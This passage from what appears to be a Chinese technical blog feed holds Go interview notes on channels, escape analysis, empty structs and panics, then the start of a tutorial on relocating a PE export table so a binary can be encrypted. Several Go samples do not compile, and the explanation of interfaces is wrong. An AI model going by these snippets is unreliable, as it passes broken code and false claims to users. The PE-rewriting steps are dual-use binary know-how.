class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">49</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">50</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">50</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">51</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">51</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><code>c通道</code>是一个缓冲为0的通道, 在<code>main</code>开始时, 启动一个协程对<code>c通道</code>写入10, 然后就关闭掉这个通道;</li><li>在<code>main</code>中通过通过<code>x, ok := &lt;-c</code>接受<code>通道c</code>里的值, 从输出结果里看出, 确实从通道里读出了之前塞入通道的10, 但是这个通道关闭后, 这个通道一直能读出内容;</li></ul><ol start="2"><li>怎样才能不读关闭后的通道<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    fmat = <span class="string">&quot;2006-01-02 15:04:05&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">        c &lt;- <span class="number">10</span></span><br><span class="line">        <span class="built_in">close</span>(c)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> x, ok := &lt;-c:</span><br><span class="line">                fmt.Printf(<span class="string">&quot;%v, 通道读取到: x=%v, ok=%v\n&quot;</span>, time.Now().Format(fmat), x, ok)</span><br><span class="line">                time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">                <span class="keyword">if</span> !ok &#123;</span><br><span class="line">                    c = <span class="literal">nil</span>     <span class="comment">// 把关闭后的通道赋值为nil, 则select读取则会阻塞</span></span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                fmt.Printf(<span class="string">&quot;%v, 没读到信息进入default\n&quot;</span>, time.Now().Format(fmat))</span><br><span class="line">                time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>输出结果<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">06</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">07</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">07</span>, 通道读取到: x=<span class="number">10</span>, ok=<span class="literal">true</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">08</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">08</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">09</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">09</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">10</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">10</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">23</span>:<span class="number">08</span>:<span class="number">11</span>, 没读到信息进入<span class="keyword">default</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="go的内存逃逸是什么-什么情况下会发生内存逃逸"><a href="#go的内存逃逸是什么-什么情况下会发生内存逃逸" class="headerlink" title="go的内存逃逸是什么? 什么情况下会发生内存逃逸?"></a>go的内存逃逸是什么? 什么情况下会发生内存逃逸?</h3><h4 id="回答-2"><a href="#回答-2" class="headerlink" title="回答"></a>回答</h4><p><code>golang程序变量</code>会携带有一组校验数据, 用来证明它的整个生命周期是否在运行时完全可知。如果变量通过了这些校验, 它就可以在<code>栈上</code>分配, 否则就说它逃逸了, 必须在堆上分配。</p><p>能引起变量逃逸到堆上的典型情况: </p><ul><li>在方法内把局部变量指针返回: 局部变量原本应该在栈中分配, 在栈中回收。但是由于返回时被外部调用, 因此其生命周期大于栈, 则溢出;</li><li>发送指针或带有指针的值到chennel中: 在编译时, 是没有办法知道哪个goroutinue会在channel上接收数据。所以编译器没法知道变量什么时候才会释放;</li><li>在一个切片上存储指针或带指针的值: 一个典型的例子就是[]*string。这会导致切片内容逃逸。尽管其后面的数组可能是在栈上分配的, 但其引用的值一定是在堆上;</li><li>slice的背后数组被重新分配了, 因为append时可能会超出其容量(cap): slice初始化的地方在编译时是可以知道的, 它最开始会在栈上分配。如果切片背后的存储要基于运行时的数据进行扩充, 就会在堆上分配;</li><li>在interface类型上调用方法: 在interface类型上调用方法都是动态调度的–方法的真正实现只能在运行时知道。想象一个io.Reader类型的变量r, 调用r.Read(b)会使得r的值和切片b背后存储的数据逃逸掉, 所以会在堆上分配;</li></ul><h4 id="代码举例"><a href="#代码举例" class="headerlink" title="代码举例"></a>代码举例</h4><blockquote><p>通过一个例子加深理解, 接下来尝试怎么通过<code>go build -gcflags=-m</code>查看逃逸的情况</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> A <span class="keyword">struct</span> &#123;</span><br><span class="line">s <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(s <span class="type">string</span>)</span></span> *A &#123;</span><br><span class="line">a := <span class="built_in">new</span>(A)</span><br><span class="line">a.s = s</span><br><span class="line"><span class="keyword">return</span> a <span class="comment">// 返回局部变量a, 在C语言为野指针, 在golang则ok但a会逃逸到堆</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := foo(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">b := a.s + <span class="string">&quot;world&quot;</span></span><br><span class="line">c := b + <span class="string">&quot;!&quot;</span></span><br><span class="line"></span><br><span class="line">fmt.Println(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行<code>go build -gcflags=-m test_Demo_01.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build -gcflags=-m test_Demo_01.<span class="keyword">go</span></span><br><span class="line"># command-line-arguments</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">9</span>:<span class="number">6</span>: can inline foo</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">16</span>:<span class="number">10</span>: inlining call to foo</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">20</span>:<span class="number">13</span>: inlining call to fmt.Println</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">9</span>:<span class="number">10</span>: leaking param: s</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">10</span>:<span class="number">10</span>: <span class="built_in">new</span>(A) escapes to heap</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">16</span>:<span class="number">10</span>: <span class="built_in">new</span>(A) does not escape</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">17</span>:<span class="number">11</span>: a.s + <span class="string">&quot;world&quot;</span> does not escape</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">18</span>:<span class="number">9</span>: b + <span class="string">&quot;!&quot;</span> escapes to heap</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">20</span>:<span class="number">13</span>: ... argument does not escape</span><br><span class="line">./test_Demo_01.<span class="keyword">go</span>:<span class="number">20</span>:<span class="number">14</span>: c escapes to heap</span><br></pre></td></tr></table></figure><ul><li><code>./test_Demo_01.go:10:10: new(A) escapes to heap</code>说明<code>new(A)</code>逃逸了, 符合上述提到的常见情况的第一种;</li><li><code>./test_Demo_01.go:17:11: a.s + &quot;world&quot; does not escape</code> 说明<code>b</code>变量没有逃逸, 因为它只存在方法内存中, 会在方法结束时被回收;</li><li><code>./test_Demo_01.go:18:9: b + &quot;!&quot; escapes to heap</code>说明<code>c</code>变量逃逸, 通过<code>fmt.Println(a ...interface&#123;&#125;)</code>打印的变量, 都会发生逃逸;</li></ul><h3 id="Go关键字fallthrough有什么作用"><a href="#Go关键字fallthrough有什么作用" class="headerlink" title="Go关键字fallthrough有什么作用"></a>Go关键字fallthrough有什么作用</h3><blockquote><p>fallthrough关键字只能用在switch中, 且只能在每一个case分支中的最后一行, 作用是如果这个case分支被执行, 将继续执行下一个case分支, 而且不会取判断下一个分支额case条件是否成立;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> <span class="string">&quot;a&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">            fmt.Println(<span class="string">&quot;匹配a&quot;</span>)</span><br><span class="line">            <span class="keyword">fallthrough</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;a成功了, 也执行b分支&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;c&quot;</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;a成功了, c分支会执行吗&quot;</span>)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;默认执行&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    匹配a</span></span><br><span class="line"><span class="comment">    a成功了, 也执行b分支</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="空结构体占不占内存空间-为什么使用空结构体"><a href="#空结构体占不占内存空间-为什么使用空结构体" class="headerlink" title="空结构体占不占内存空间? 为什么使用空结构体?"></a>空结构体占不占内存空间? 为什么使用空结构体?</h3><blockquote><p>空结构体是没有内存大小的结构体;</p></blockquote><p>通过unsafe.Sizeof()可以查看空结构体的宽度, 代码如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">fmt.Println(unsafe.Sizeof(s)) <span class="comment">// printfs 0</span></span><br></pre></td></tr></table></figure><p>准确的来说, 空结构体有一个特殊起点: <code>zerobase</code>变量; <code>zerobase</code>是一个占用8个字节的<code>uintptr</code>全局变量。每次定义<code>struct&#123;&#125;</code>类型的变量, 编译器只是把<code>zerobase</code>变量的地址给出去。也就是说空结构体的变量的内存地址都是一样的。</p><p>空结构体的使用场景主要有三种: </p><ul><li>实现方法接收者: 在业务场景下, 我们需要将方法组合起来, 代表其一个”分组”的, 便于后续拓展和维护;</li><li>实现集合类型: 在Go语言的标准库中并没有提供集合(Set)的相关实现, 因此一般在代码中图方便, 会直接用map来替代: <code>type Set map[string]struct&#123;&#125;</code>。</li><li>实现通道: 在Go channel的使用场景中, 常常会遇到通知型channel, 其不需要发送任何数据, 只是用于协调Goroutinue的运行, 用于流转各类状态或是控制并发情况;</li></ul><h3 id="Go语言中-下面哪个关于指针的说法是错误的"><a href="#Go语言中-下面哪个关于指针的说法是错误的" class="headerlink" title="Go语言中, 下面哪个关于指针的说法是错误的?"></a>Go语言中, 下面哪个关于指针的说法是错误的?</h3><ul><li>指针不能进行算术运算</li><li>指针可以比较</li><li>指针可以是nil</li><li><strong>指针可以指向任何类型</strong></li></ul><p>针对在Go语言中只能指向相同类型的结构体或者基本类型。例如，一个int类型的变量, 只能指向int类型的指针。如果尝试将一个不同类型的指针赋给一个变量, 将会导致编译错误。</p><h3 id="Go语言的接口类型是如何实现的"><a href="#Go语言的接口类型是如何实现的" class="headerlink" title="Go语言的接口类型是如何实现的?"></a>Go语言的接口类型是如何实现的?</h3><blockquote><p>在Go语言中, 接口类型是通过**类型嵌入(embedding)**的方式实现的。每个实现了接口的类型的结构体中都有一个隐含的成员, 该成员是指向接口类型的指针。通过这种方式, 接口实现了堆类型的约束和定义。</p></blockquote><blockquote><p>具体来说, 当一个类型实现了某个接口的所有方法后, 该类型就被认为是实现了该接口。结构体中, 可以通过嵌入接口类型的方式来实现接口方法。在实现接口方法时, 方法的签名需要与接口定义中的方法签名保持一致。</p></blockquote><h3 id="Go-string的底层实现"><a href="#Go-string的底层实现" class="headerlink" title="Go string的底层实现"></a>Go string的底层实现</h3><p>源码包src&#x2F;runTime&#x2F;string.go stringStruct定义了string的数据结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type stringStruct <span class="keyword">struct</span> &#123;</span><br><span class="line">    str unsafe.Pointer      <span class="comment">// 字符串的首地址</span></span><br><span class="line">    <span class="built_in">len</span> <span class="type">int</span>                 <span class="comment">// 字符串的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>声明:<br>如下代码所示, 可以声明一个string变量赋予初值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str <span class="type">string</span></span><br><span class="line">str = <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><p>字符串构建过程是根据字符串构建stringStruct, 再转化成string, 转化源码如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gostringnocopy</span><span class="params">(str *<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    ss := stringStruct&#123;                 <span class="comment">// 先构造stringStruct</span></span><br><span class="line">        str: unsafe.Pointer(str),</span><br><span class="line">        <span class="built_in">len</span>: findnull(str)</span><br><span class="line">    &#125;</span><br><span class="line">    s := *(*<span class="type">string</span>)(unsafe.Pointer(&amp;ss))    <span class="comment">// 再将stringStruct转换成string</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Go如何避免panic"><a href="#Go如何避免panic" class="headerlink" title="Go如何避免panic"></a>Go如何避免panic</h3><blockquote><p>首先明确panic定义: go把真正的异常叫做panic, 是指出现重大错误, 比如数据越界之类的编程BUG或者是那些需要人工介入才能修复的问题, 比如程序启动时加载资源出错等等。</p></blockquote><p>几个容易出现panic的点:</p><ul><li>函数返回值或参数为指针类型, nil, 未初始化结构体, 此时调用容易出现panic, 可加 !&#x3D;nil 进行判断;</li><li>数组切片越界</li><li>如果我们关闭未初始化通道, 重复关闭通道, 向已经关闭的通道中发送数据, 这三种情况会引发panic, 导致程序崩溃;</li><li>如果我们直接操作未初始化的映射(map), 也会引发panic, 导致程序崩溃;</li><li>另外, 操作映射可能会遇到的更为严重的一个问题是, 同时对同一个映射并发读写, 它会触发runtime.throw, 不像panic可以使用recover捕获。所以, 我们再对同一个映射并发读写时, 一定要使用锁;</li><li>如果类型断言使用不当, 比如我们不接受布尔值的话, 类型断言失败也会引发panic, 导致程序崩溃;</li><li>如果很多时候不可避免地出现了panic, 记得使用defer&#x2F;recover;</li></ul><h3 id="空结构体的使用场景"><a href="#空结构体的使用场景" class="headerlink" title="空结构体的使用场景"></a>空结构体的使用场景</h3><blockquote><p>空结构体(empty struct)是在Go语言中一个特殊地概念, 它没有任何字段。在Go中, 它通常被称为匿名结构体或零宽度结构体。尽管没有字段, 但它在某些请款下仍然有其他用途</p></blockquote><h4 id="1-占位符"><a href="#1-占位符" class="headerlink" title="1. 占位符"></a>1. 占位符</h4><blockquote><p>空结构体可以用作占位符, 用于表示某个数据结构或数据集合地存在而不实际存储任何数据。这在某些数据结构的实现中非常有用, 特别是要实现某种数据结构的集合或映射时, 但并不需要存储实际的值。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表示集合中是否包含某个元素的映射</span></span><br><span class="line">set := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">set[<span class="string">&quot;apple&quot;</span>] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="2-信号量"><a href="#2-信号量" class="headerlink" title="2. 信号量"></a>2. 信号量</h4><blockquote><p>空结构体可以用作信号量, 用于控制并发操作。通过向通道发送或接收空结构体, 可以实现信号的传递和同步;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用通道作为信号量</span></span><br><span class="line">semaphore := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">5</span>)     <span class="comment">// 控制并发数为5</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    semaphore &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;     <span class="comment">// 获取信号量</span></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        &lt;- semaphero</span><br><span class="line">    &#125;()                         <span class="comment">// 释放信号量</span></span><br><span class="line">    <span class="comment">// 执行并发操作</span></span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><h4 id="3-强调结构"><a href="#3-强调结构" class="headerlink" title="3.强调结构"></a>3.强调结构</h4><blockquote><p>有时, 空结构体可用于强调某个结构的重要性或存在。它可以用作结构体的标签, 表示关注该结构的存在而不是其内容;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表示一篇文章的元信息, 不包含实际内容</span></span><br><span class="line"><span class="keyword">type</span> Article <span class="keyword">struct</span> &#123;</span><br><span class="line">    Title       <span class="type">string</span></span><br><span class="line">    Author      <span class="type">string</span></span><br><span class="line">    PublishedAt time.Time</span><br><span class="line">    MetaData    <span class="keyword">struct</span>&#123;&#125;        <span class="comment">// 空结构体强调元信息的存在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-JSON序列化"><a href="#4-JSON序列化" class="headerlink" title="4. JSON序列化"></a>4. JSON序列化</h4><blockquote><p>在处理JSON数据时, 有时需要表示一个空对象, 可以使用空结构体来表示JSON中的空对象<code>&#123;&#125;</code>;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">emptyJSON := <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">jsonBytes, _ := json.Marshal(emptyJSON)</span><br><span class="line">fmt.Println(<span class="type">string</span>(jsonBytes))      <span class="comment">// 输出: &#123;&#125;</span></span><br></pre></td></tr></table></figure><p>尽管空结构体没有字段, 但它在上述情况下提供了一种轻量级的方式来处理特定的需求, 而无需分配额外的内存或定义具体的数据结构。</p><p>struct的特点:</p><ul><li>用来自定义复杂数据结构;</li><li>struct里面可以包含多个字段(属性);</li><li>struct类型可以定义方法, 注意和函数的区分;</li><li>struct类型是值类型;</li><li>struct类型可以嵌套;</li><li>Go语言没有calss类型, 只有struct类型;</li></ul><p>特殊之处:</p><ul><li>结构体是用户单独定义的类型, 不能和其他类型进行强制转换;</li><li>golang中的struct没有构造函数, 一般可以使用工厂模式来解决这个问题;</li><li>我们可以为struct的每个字段, 写上一个tag。这个tag可以通过反射的机制获取到, 最常用的场景就是json序列化和反序列化;</li><li>结构体中的字段可以没有名字, 即匿名字段;</li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动导出表</title>
      <link href="/cfe5db75.html"/>
      <url>/cfe5db75.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>为什么要移动导出表</strong></p><ol><li>导出表由编译器生成, 导出表中存储了该PE文件有哪些导出函数以及函数的地址;</li><li>在程序启动时, 系统会根据导出表做初始工作; 将用到的Dll中的函数地址存储到IAT表中;</li><li>为了保护程序, 可以对.EXE的二进制代码进行加密操作;<ul><li>如果进行加密, 各种表的信息以及数据是混在一起的, 加密后会导致程序无法正常执行;</li><li>因此需要新增一个节, 并将PE中的表移动到新节中, 然后将代码和数据进行加密;</li></ul></li></ol></div><span id="more"></span><h2 id="移动导出表步骤"><a href="#移动导出表步骤" class="headerlink" title="移动导出表步骤"></a>移动导出表步骤</h2><div class="note info"><p><strong>移动导出表步骤</strong></p><ol><li>读取Dll文件并在FileBuffer中新增一个节(.export);</li><li>复制<code>AddressOfFunctions</code>(函数地址表); <ul><li>长度: <code>NumberOfFunctions * 4</code>;</li></ul></li><li>复制<code>AddressOfNameOrdinals</code>(函数序号表);<ul><li>长度: <code>NumberOfNames * 2</code>;</li></ul></li><li>复制<code>AddressOfNames</code>(函数名称表);<ul><li>长度: <code>NumberOfNames * 4</code>;</li></ul></li><li>复制所有函数名;<ul><li>长度不确定, 复制时直接修复<code>AddressOfNames</code>;</li></ul></li><li>复制<code>IMAGE_EXPORT_DIRECTORY</code>结构;</li><li>修复<code>IMAGE_EXPORT_DIRECTORY</code>结构中的<code>AddressOfFunctions</code>、<code>AddressOfNameOrdinals</code>、<code>AddressOfNames</code>;</li><li>修复目录项中的值, 指向新的<code>IMAGE_EXPORT_DIRECTORY</code>;</li></ol></div><h2 id="RVA转FOA"><a href="#RVA转FOA" class="headerlink" title="RVA转FOA"></a>RVA转FOA</h2><blockquote><p>将RVA转换成FOA</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">RVA2FOA</span><span class="params">(DWORD dwRVA, LPVOID lpBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    IMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line">    <span class="keyword">if</span>(dwRVA &lt; pSec[<span class="number">0</span>].VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwRVA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>; i&lt;pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwRVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FOA转RVA"><a href="#FOA转RVA" class="headerlink" title="FOA转RVA"></a>FOA转RVA</h2><blockquote><p>将FOA转换成RVA</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 